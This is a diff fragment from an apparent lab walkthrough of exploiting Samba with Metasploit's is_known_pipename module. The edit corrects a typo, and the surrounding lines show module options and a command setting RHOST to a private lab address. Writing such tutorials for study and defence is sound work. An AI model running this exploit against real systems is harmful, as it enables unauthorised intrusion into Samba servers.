@@ -262,7 +262,7 @@ Exploit target:
    0   Automatic (Interact)
 ```
 
-So we have already determined our local folder (SMB_FOLDER) and the share name (SMB_SHARE_NAME) along with out remote host IP (RHOST), but the RPORT is set to 445 by default, but our Samba is running on 139, so lets set our options to reflect this
+So we have already determined our local folder (SMB_FOLDER) and the share name (SMB_SHARE_NAME) along with our remote host IP (RHOST), but the RPORT is set to 445 by default, but our Samba is running on 139, so lets set our options to reflect this
 
 ```
 msf exploit(linux/samba/is_known_pipename) > set RHOST 192.168.56.101
